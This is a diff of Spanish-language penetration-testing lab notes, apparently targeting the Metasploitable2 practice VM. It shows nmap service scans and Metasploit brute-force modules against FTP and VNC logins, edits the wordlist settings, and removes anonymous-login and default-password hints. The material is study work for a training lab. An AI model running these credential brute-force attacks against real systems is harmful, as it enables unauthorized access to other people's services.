@@ -358,19 +358,13 @@ nmap -sV -p 21 <IP_VICTIMA>
 # 2. Fuerza bruta FTP
 msfconsole
 use auxiliary/scanner/ftp/ftp_login
-set USER_FILE /usr/share/wordlists/metasploit/http_default_users.txt
-set PASS_FILE /usr/share/wordlists/metasploit/http_default_pass.txt
-
+set USERPASS_FILE /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
 
 exploit
 
-# 3. Alternativa: usuario y contraseña en blanco (Metasploitable2 permite
-#    acceso anónimo)
-set USERNAME anonymous
-set PASSWORD anonymous
-run
 ```
 ![](attachments/{1B8BE9E7-78A1-48F5-883D-ADC5AB797D69}.png)
+![](attachments/{1C9E4E2D-2719-4326-947A-A12C9E3D9066}.png)
 
 ### VNC Server — Fuerza bruta
 
@@ -382,13 +376,11 @@ nmap -sV -p 5900 <IP_VICTIMA>
 
 # 2. Fuerza bruta VNC
 use auxiliary/scanner/vnc/vnc_login
-set RHOSTS <IP_VICTIMA>
-set RPORT 5900
+
 set THREADS 5
 run
 
-# 3. En Metasploitable2, la contraseña de VNC es "password"
-#    Una vez obtenida, conectar con:
+# 3. Una vez obtenida, conectar con:
 vncviewer <IP_VICTIMA>:5900
 ```
 
